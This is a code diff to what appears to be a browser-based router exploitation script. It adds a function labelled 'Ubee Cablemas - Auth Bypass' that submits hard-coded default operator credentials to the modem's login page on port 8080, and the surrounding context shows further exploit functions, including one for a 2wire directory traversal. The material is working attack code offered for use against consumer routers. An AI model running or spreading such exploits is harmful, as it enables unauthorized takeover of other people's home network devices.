@@ -1985,6 +1985,16 @@ form += '">\
 	post('http://' + ip + '	/wl_chanel.html', form);
 }
 
+// Ubee Cablemas - Auth Bypass
+function ubecablemas_bypass(ip)
+{
+	ip = ip || "192.168.1.1";
+	var form = '<input	type="hidden"	name="loginUsername" value="operator"/>';
+	form += '<input	type="hidden"	name="loginPassword"	value="cmoperator"/>';
+	form += '</form>';
+	post('http://' + ip + ':8080/goform/login', form);
+}
+
 // 2wire 4011G and 5012NV - Directory Traversal js by sinnet3000
 function twowire4011g5012nv_dirtraversal(ip)
 {
